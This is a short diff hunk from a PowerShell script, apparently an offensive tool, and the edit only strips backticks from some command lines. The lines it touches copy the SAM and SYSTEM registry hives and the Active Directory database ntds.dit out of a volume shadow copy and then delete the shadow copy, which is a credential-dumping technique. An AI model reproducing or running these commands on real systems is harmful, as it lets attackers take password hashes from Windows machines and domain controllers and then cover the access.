@@ -63,15 +63,15 @@ Code by @al14s
     }
 
 
-    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $SAMpath`
-    `cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SYSTEM" $SYSTEMpath`
+    cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SAM" $SAMpath
+    cmd /c copy "$($volume.DeviceObject)\windows\system32\config\SYSTEM" $SYSTEMpath
     if($ntdsSource)
     {
-        `cmd /c copy "$($volume.DeviceObject)\$ntdsSource\ntds.dit" $ntdspath`
+        cmd /c copy "$($volume.DeviceObject)\$ntdsSource\ntds.dit" $ntdspath
     }
     else
     {
-        `cmd /c copy "$($volume.DeviceObject)\windows\system32\ntds.dit" $ntdspath`
+        cmd /c copy "$($volume.DeviceObject)\windows\system32\ntds.dit" $ntdspath
     }
     $volume.Delete()
     if($notrunning -eq 1)
